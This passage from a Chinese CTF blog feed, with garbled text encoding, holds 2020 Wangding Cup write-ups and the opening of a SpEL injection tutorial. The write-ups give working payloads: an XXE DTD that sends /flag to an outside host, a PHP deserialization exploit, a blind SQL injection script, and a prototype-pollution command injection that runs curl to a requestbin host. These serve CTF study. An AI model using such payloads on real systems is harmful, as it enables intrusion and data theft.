request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);      return;    }    String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);    File file = new File(path + &quot;/&quot; + fileName);    if (!file.exists())    {      request.setAttribute(&quot;message&quot;, &quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½!&quot;);      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);      return;    }    String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1);    response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;));    FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName);    ServletOutputStream out = response.getOutputStream();    byte[] buffer = new byte[&#39;?&#39;];    int len = 0;    while ((len = in.read(buffer)) &gt; 0) {      out.write(buffer, 0, len);    }    in.close();    out.close();  }  public String findFileSavePathByFileName(String filename, String saveRootPath)  {    int hashCode = filename.hashCode();    int dir1 = hashCode &amp; 0xF;    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;    String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;    File file = new File(dir);    if (!file.exists()) {      file.mkdirs();    }    return dir;  }}</code></pre><p>UploadServlet</p><pre><code class="java">package cn.abc.servlet;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.PrintStream;import java.util.List;import java.util.UUID;import javax.servlet.RequestDispatcher;import javax.servlet.ServletContext;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;import org.apache.poi.openxml4j.exceptions.InvalidFormatException;import org.apache.poi.ss.usermodel.Sheet;import org.apache.poi.ss.usermodel.Workbook;import org.apache.poi.ss.usermodel.WorkbookFactory;public class UploadServlet  extends HttpServlet{  private static final long serialVersionUID = 1L;  protected void doGet(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    doPost(request, response);  }  protected void doPost(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    String savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);    String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);    File tempFile = new File(tempPath);    if (!tempFile.exists()) {      tempFile.mkdir();    }    String message = &quot;&quot;;    try    {      DiskFileItemFactory factory = new DiskFileItemFactory();      factory.setSizeThreshold(102400);      factory.setRepository(tempFile);      ServletFileUpload upload = new ServletFileUpload(factory);      upload.setProgressListener(new UploadServlet.1(this));      upload.setHeaderEncoding(&quot;UTF-8&quot;);      upload.setFileSizeMax(1048576L);      upload.setSizeMax(10485760L);      if (!ServletFileUpload.isMultipartContent(request)) {        return;      }      List&lt;FileItem&gt; list = upload.parseRequest(request);      for (FileItem fileItem : list) {        if (fileItem.isFormField())        {          String name = fileItem.getFieldName();          String str1 = fileItem.getString(&quot;UTF-8&quot;);        }        else        {          String filename = fileItem.getName();          if ((filename != null) &amp;&amp; (!filename.trim().equals(&quot;&quot;)))          {            String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);            InputStream in = fileItem.getInputStream();            if ((filename.startsWith(&quot;excel-&quot;)) &amp;&amp; (&quot;xlsx&quot;.equals(fileExtName))) {              try              {                Workbook wb1 = WorkbookFactory.create(in);                Sheet sheet = wb1.getSheetAt(0);                System.out.println(sheet.getFirstRowNum());              }              catch (InvalidFormatException e)              {                System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);                e.printStackTrace();              }            }            String saveFilename = makeFileName(filename);            request.setAttribute(&quot;saveFilename&quot;, saveFilename);            request.setAttribute(&quot;filename&quot;, filename);            String realSavePath = makePath(saveFilename, savePath);            FileOutputStream out = new FileOutputStream(realSavePath + &quot;/&quot; + saveFilename);            byte[] buffer = new byte[&#39;?&#39;];            int len = 0;            while ((len = in.read(buffer)) &gt; 0) {              out.write(buffer, 0, len);            }            in.close();            out.close();            message = &quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½!&quot;;          }        }      }    }    catch (FileUploadException e)    {      e.printStackTrace();    }    request.setAttribute(&quot;message&quot;, message);    request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response);  }  private String makeFileName(String filename)  {    return UUID.randomUUID().toString() + &quot;_&quot; + filename;  }  private String makePath(String filename, String savePath)  {    int hashCode = filename.hashCode();    int dir1 = hashCode &amp; 0xF;    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;    String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;    File file = new File(dir);    if (!file.exists()) {      file.mkdirs();    }    return dir;  }}</code></pre><p>åœ¨æŠ¥é”™ä¸­æˆ‘ä»¬çœ‹åˆ° poi-ooxml-3.10<br>è°·æ­Œä¸‹å¯ä»¥å‘ç°å®ƒå…¶å®æ˜¯æœ‰ä¸ªæ¼æ´çš„<a href="https://www.cnblogs.com/iyiyang/articles/10055824.html" target="_blank" rel="noopener">https://www.cnblogs.com/iyiyang/articles/10055824.html</a></p><p>åœ¨æœåŠ¡å™¨ä¸Šæ”¾ä¸ªevil.dtd,å†…å®¹ä¸ºï¼š</p><pre><code class="xml=">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://ccreater.top:60004/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>åˆ†åˆ«åœ¨ <code>[Content_Types].xmlã€/xl/workbook.xmlã€/xl/worksheets/shee1.xml</code>  ä¸­æ·»åŠ <br><code>&lt;!DOCTYPE ANY SYSTEM &quot;http://ccreater.top:60000/evil.dtd&quot;&gt;  åœ¨æ ¹å…ƒç´ ä¸­æ·»åŠ &lt;b&gt;&amp;send&lt;/b&gt;</code></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200510180925.png" alt="image9568"></p><p> ç›‘å¬ç«¯å£æ‹¿åˆ°flag</p><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><pre><code class="php">&lt;?phpclass FileHandler {    public $op;    public $filename;    public $content;    function __construct() {        $op = &quot;2e0&quot;;        $filename = &quot;flag.php&quot;;    }    public function set($filename) {        $this-&gt;op = &#39;2e0&#39;;        $this-&gt;filename = $filename;    }}$url = &#39;http://5f56366ab1864e38b5d46f4b070e8082a5878207423a4008.cloudgame1.ichunqiu.com/?str=&#39;;$file = new FileHandler;$file-&gt;set($_GET[1]);$payload = urlencode(serialize($file));echo file_get_contents($url . $payload);#echo urlencode(serialize($payload));</code></pre><p>åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡<code>if($this-&gt;op === &quot;2&quot;)$this-&gt;op = &quot;1&quot;;</code><br>å°†FileHandlerä¸­çš„å˜é‡æ”¹ä¸ºpublicæ¥ç»•è¿‡is_validçš„é™åˆ¶<br>è¯»å– /proc/self/cmdline å¾—çŸ¥é…ç½®æ–‡ä»¶ï¼š<code>/web/config/httpd.conf</code><br>è¯»å–é…ç½®æ–‡ä»¶å¾—çŸ¥ webç›®å½•ï¼š<code>DocumentRoot &quot;/web/html&quot;</code><br>è¯»å–flag:<code>/web/html/flag.php</code></p><h3 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h3><p>åªæœ‰ä¸€ä¸ªregister.php,fuzzæ–¹å‘å­˜åœ¨sqlæ³¨å…¥æ¼æ´<br>ç”±äºé¢˜ç›®é™åˆ¶æœ€å¤šåªèƒ½æ’å…¥20ä¸ªæ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬è®©mysqlåœ¨è¿ç®—çš„æ—¶å€™æŠ¥é”™å°±ä¸ä¼šæ’å…¥æ•°æ®ï¼Œé¿å…äº†å¤šæ¬¡é‡å¼€å®¹å™¨çš„éº»çƒ¦<br>æµ‹è¯•åï¼Œå…·ä½“payloadä¸º:<code>username=&#39;,&#39;aaa&#39;-if(ascii(select substr(database(),1,1))&gt;1,sleep(5)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))%23&amp;password=aaa</code></p><p>å› ä¸ºinformation_schemaè¢«è¿‡æ»¤ï¼Œè¿˜æœ‰å…¶ä»–çš„ä¸€äº›èƒ½å¤ŸæŸ¥è¯¢è¡¨åçš„è¡¨ä¸å­˜åœ¨ï¼Œäºæ˜¯åªèƒ½çŒœæµ‹è¡¨å</p><p>ç›²æ³¨è„šæœ¬ï¼š</p><pre><code class="python">import requestsimport time#ä¿®æ”¹biggerå’Œsqlinjå°±å¥½#å®ç°biggeræ‰èƒ½ä½¿ç”¨def findByDichotomy(begin,end):    max_num=end    while True:        mid=int((begin+end)/2)        if begin==max_num:            return False        if begin==end:            return begin        if end-begin==1:            if bigger(begin):                return end            else:                return begin        if bigger(mid):            begin=mid+1        else:            end=mid#å¾…æ±‚æ•°æ®å¤§äºnumdef bigger(num):    time.sleep(0.5)    sql=&quot;select group_concat(b) from (select (select 1)a,(select 2)b union select * from flag)`table`&quot;    burp0_url = &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com:80/register_do.php&quot;    burp0_cookies = {&quot;UM_distinctid&quot;: &quot;16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768&quot;, &quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1587227364&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1589089931&quot;, &quot;__jsluid_h&quot;: &quot;5303c9bcf8d25c671142a156f959a817&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;username&quot;: &quot;&#39;,&#39;aaa&#39;-if((ascii(substr(( {sql} ),{POS},2))&gt;{GUESS}),sleep(2)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))#&quot;.format(GUESS=num,POS=pos,sql=sql), &quot;password&quot;: &quot;aaa&quot;}    try:        r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=2)    except Exception:        return True    print(&quot;test &quot;+str(num))    print(r.text)    return Falsedef less(num):    passdef equal(num):    pass#1,flag{}result=&quot;2,flag{&quot;pos=len(result)+1while True:    num=findByDichotomy(32,128)    if num is False:        print(result)        break    result+=chr(num)    print(result)    pos+=1</code></pre><h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>æºä»£ç :</p><pre><code class="javascript">var express = require(&#39;express&#39;);var path = require(&#39;path&#39;);const undefsafe = require(&#39;undefsafe&#39;);const { exec } = require(&#39;child_process&#39;);var app = express();class Notes {    constructor() {        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = {};    }    write_note(author, raw_note) {        this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note};    }    get_note(id) {        var r = {}        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    }    edit_note(id, author, raw) {        undefsafe(this.note_list, id + &#39;.author&#39;, author);        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);    }    get_all_notes() {        return this.note_list;    }    remove_note(id) {        delete this.note_list[id];    }}var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));app.set(&#39;view engine&#39;, &#39;pug&#39;);app.use(express.json());app.use(express.urlencoded({ extended: false }));app.use(express.static(path.join(__dirname, &#39;public&#39;)));app.get(&#39;/&#39;, function(req, res, next) {  res.render(&#39;index&#39;, { title: &#39;Notebook&#39; });});app.route(&#39;/add_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;});    })    .post(function(req, res) {        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) {            notes.write_note(author, raw);            res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;});        }    })app.route(&#39;/edit_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;});    })    .post(function(req, res) {        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) {            notes.edit_note(id, author, enote);            res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;});        }    })app.route(&#39;/delete_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;});    })    .post(function(req, res) {        let id = req.body.id;        if (id) {            notes.remove_note(id);            res.render(&#39;mess&#39;, {message: &quot;delete done&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;});        }    })app.route(&#39;/notes&#39;)    .get(function(req, res) {        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) {            a_note = notes.get_all_notes();        } else {            a_note = notes.get_note(q);        }        res.render(&#39;note&#39;, {list: a_note});    })app.route(&#39;/status&#39;)    .get(function(req, res) {        let commands = {            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        };        for (let index in commands) {            exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; {                if (err) {                    return;                }                console.log(`stdout: ${stdout}`);            });        }        res.send(&#39;OK&#39;);        res.end();    })app.use(function(req, res, next) {  res.status(404).send(&#39;Sorry cant find that!&#39;);});app.use(function(err, req, res, next) {  console.error(err.stack);  res.status(500).send(&#39;Something broke!&#39;);});const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))</code></pre><p>è°·æ­Œå‘ç°unsafeçš„æŸäº›ç‰ˆæœ¬å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ <a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><p>é˜…è¯»ä»£ç å‘ç°å¯ä»¥é€šè¿‡edit_noteæ¥æ±¡æŸ“åŸå‹é“¾ç»“åˆstatuså¤„æ¥å‘½ä»¤æ‰§è¡Œ</p><p>payload:<code>id=__proto__.abc&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code></p><p>ä»¤æˆ‘æœ‰äº›ä¸è§£çš„æ˜¯ï¼Œæˆ‘æœ¬åœ°å¤ç°payloadä¸ºï¼š<code>id=__proto__&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code>,æœ¬åœ°æ˜¯å¯ä»¥çš„ï¼Œæ‰“é¶æœºçš„æ—¶å€™åè€Œä¸è¡Œ</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/12/2020å¹´ç½‘é¼æ¯é’é¾™ç»„/">http://blog.ccreater.top/2020/05/12/2020å¹´ç½‘é¼æ¯é’é¾™ç»„/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</title>
      <link href="/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Spring Expression Languageï¼ˆç®€ç§°SpELï¼‰ã€‚SpELå¼•æ“ä½œä¸ºSpring ç»„åˆé‡Œçš„è¡¨è¾¾å¼è§£æçš„åŸºç¡€ ï¼Œä½†å®ƒä¸ç›´æ¥ä¾èµ–äºSpring,å¯ç‹¬ç«‹ä½¿ç”¨ã€‚ </p><h2 id="SpELæµ‹è¯•ä»£ç "><a href="#SpELæµ‹è¯•ä»£ç " class="headerlink" title="SpELæµ‹è¯•ä»£ç "></a>SpELæµ‹è¯•ä»£ç </h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());String message = (String) exp.getValue();//String message = exp.getValue(String.class);</code></pre><p> ä¸Šè¿°ä»£ç å«ä¹‰ä¸ºé¦–å…ˆåˆ›å»º<code>ExpressionParser</code>è§£æè¡¨è¾¾å¼ï¼Œä¹‹åæ”¾ç½®è¡¨è¾¾å¼ï¼Œæœ€åé€šè¿‡<code>getValue</code>æ–¹æ³•æ‰§è¡Œè¡¨è¾¾å¼ï¼Œé»˜è®¤å®¹å™¨æ˜¯springæœ¬èº«çš„å®¹å™¨ï¼š<code>ApplicationContext</code>ã€‚ </p><p><code>TemplateParserContext</code>æ·»åŠ äº† <strong>è¡¨è¾¾å¼æ¨¡æ¿</strong> è§£æå™¨</p><h2 id="SpELè¯­æ³•"><a href="#SpELè¯­æ³•" class="headerlink" title="SpELè¯­æ³•"></a>SpELè¯­æ³•</h2><h3 id="ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼"><a href="#ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼" class="headerlink" title="ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼"></a>ä½¿ç”¨SpELæ¥å£è¿›è¡Œè¡¨è¾¾å¼æ±‚å€¼</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);String message = (String) exp.getValue();</code></pre><h3 id="æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°"><a href="#æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°" class="headerlink" title="æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°"></a>æ–¹æ³•è°ƒç”¨ï¼Œè®¿é—®å±æ€§ï¼Œè°ƒç”¨æ„é€ å‡½æ•°</h3><p>è¿™äº›éƒ½å’Œå¹³æ—¶çš„javaæ²¡ä»€ä¹ˆä¸åŒ,demo:</p><p>è®¿é—®å±æ€§ï¼š</p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);System.out.println((Object)exp.getValue());</code></pre><p>æ–¹æ³•è°ƒç”¨ï¼š</p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);System.out.println((Object)exp.getValue());</code></pre><p>è°ƒç”¨æ„é€ å‡½æ•°ï¼š</p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);System.out.println((Object)exp.getValue());</code></pre><h3 id="è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰"><a href="#è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰" class="headerlink" title="è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰"></a>è®¿é—®æ ¹å¯¹è±¡å±æ€§æ–¹æ³•ç­‰</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);        System.out.println((Object)exp.getValue(new Object(){            public String fucker=&quot;fucker&quot;;            public String tou(){                return &quot;toutoutou&quot;;            };        }));</code></pre><p>ç»“æœï¼š<code>fuckertoutoutou</code></p><h3 id="ä¼ é€’æ ¹å¯¹è±¡-root"><a href="#ä¼ é€’æ ¹å¯¹è±¡-root" class="headerlink" title="ä¼ é€’æ ¹å¯¹è±¡/#root"></a>ä¼ é€’æ ¹å¯¹è±¡/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendarGregorianCalendar c = new GregorianCalendar();c.set(1856, 7, 9);// The constructor arguments are name, birthday, and nationality.Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;name&quot;);EvaluationContext context = new StandardEvaluationContext(tesla);String name = (String) exp.getValue(context);</code></pre><p>è¿™é‡Œçš„root object æ˜¯ tesla,<code>parser.parseExpression(&quot;name&quot;);</code>ä¼šè¿”å›teslaçš„nameå±æ€§</p><h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendarGregorianCalendar c = new GregorianCalendar();c.set(1856, 7, 9);// The constructor arguments are name, birthday, and nationality.Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;name&quot;);String name = (String) exp.getValue(tesla);</code></pre><h3 id="æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸-å–å€¼"><a href="#æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸-å–å€¼" class="headerlink" title="æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸ å–å€¼"></a>æ•°ç»„å’Œåˆ—è¡¨å’Œå­—å…¸ å–å€¼</h3><p> å±æ€§åçš„ç¬¬ä¸€ä¸ªå­—æ¯å¯ä»¥æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚æ•°ç»„å’Œåˆ—è¡¨çš„å†…å®¹å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·æ¥æ ‡è®° </p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();// Inventions ArrayStandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);// evaluates to &quot;Induction motor&quot;String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(        teslaContext, String.class);// Members ListStandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);// evaluates to &quot;Nikola Tesla&quot;String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(        societyContext, String.class);// List and Array navigation// evaluates to &quot;Wireless communication&quot;String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(        societyContext, String.class);</code></pre><p> Mapsçš„å€¼ç”±æ–¹æ‹¬å·å†…æŒ‡å®šå­—ç¬¦ä¸²çš„Keyæ¥æ ‡è¯†å¼•ç”¨ã€‚åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œå› ä¸ºOfficers mapçš„Keyæ˜¯stringç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿‡å­—ç¬¦ä¸²å¸¸é‡æŒ‡å®šã€‚ </p><pre><code class="java">// Officer&#39;s DictionaryInventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(        societyContext, Inventor.class);// evaluates to &quot;Idvor&quot;String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(        societyContext, String.class);// setting valuesparser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(        societyContext, &quot;Croatia&quot;);</code></pre><h3 id="å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸"><a href="#å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸" class="headerlink" title="å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸"></a>å£°æ˜æ•°ç»„åˆ—è¡¨å’Œå­—å…¸</h3><p>åˆ—è¡¨ï¼š</p><pre><code class="java">// evaluates to a Java list containing the four numbersList numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre><p>å­—å…¸ï¼š</p><pre><code class="java">// evaluates to a Java map containing the two entriesMap inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre><p>æ•°ç»„ï¼š</p><p> æ•°ç»„å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºJavaçš„è¯­æ³•åˆ›å»ºï¼Œåˆ›å»ºæ—¶å¯ä»¥äº‹å…ˆæŒ‡å®šæ•°ç»„çš„å®¹é‡å¤§å°ã€è¿™ä¸ªæ˜¯å¯é€‰çš„ã€‚ åœ¨åˆ›å»ºå¤šç»´æ•°ç»„æ—¶è¿˜ä¸æ”¯æŒäº‹å…ˆæŒ‡å®šåˆå§‹åŒ–çš„å€¼ã€‚</p><pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre><h3 id="Tæ“ä½œç¬¦"><a href="#Tæ“ä½œç¬¦" class="headerlink" title="Tæ“ä½œç¬¦"></a>Tæ“ä½œç¬¦</h3><p><code>T()</code>è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ã€‚ </p><p> Tæ“ä½œç¬¦æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ“ä½œç¬¦ã€å¯ä»¥åŒäºæŒ‡å®šjava.lang.Classçš„å®ä¾‹ï¼ˆç±»å‹ï¼‰ã€‚é™æ€æ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ“ä½œç¬¦è°ƒç”¨ã€‚  *<em>T()å¼•ç”¨java.langåŒ…é‡Œé¢çš„ç±»å‹ä¸éœ€è¦é™å®šåŒ…å…¨åï¼Œä½†æ˜¯å…¶ä»–ç±»å‹çš„å¼•ç”¨å¿…é¡»è¦ã€‚ *</em></p><pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);boolean trueValue = parser.parseExpression(        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)        .getValue(Boolean.class);</code></pre><h3 id="è¡¨è¾¾å¼æ¨¡æ¿"><a href="#è¡¨è¾¾å¼æ¨¡æ¿" class="headerlink" title="è¡¨è¾¾å¼æ¨¡æ¿"></a>è¡¨è¾¾å¼æ¨¡æ¿</h3><p> è¡¨è¾¾å¼æ¨¡æ¿è¿è¡Œåœ¨ä¸€æ®µæ–‡æœ¬ä¸­æ··åˆåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ±‚å€¼è¡¨è¾¾å¼æ¨¡å—ã€‚å„ä¸ªæ±‚å€¼å—éƒ½é€šè¿‡å¯è¢«è‡ªå®šä¹‰çš„å‰åç¼€å­—ç¬¦åˆ†éš”ï¼Œä¸€ä¸ªé€šç”¨çš„é€‰æ‹©æ˜¯ä½¿ç”¨#{ }ä½œä¸ºåˆ†éš”ç¬¦ã€‚ </p><pre><code class="java">String randomPhrase = parser.parseExpression(        &quot;random number is #{T(java.lang.Math).random()}&quot;,        new TemplateParserContext()).getValue(String.class);</code></pre><p>ç»“æœï¼š<code>random number is xxxx</code></p><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p> 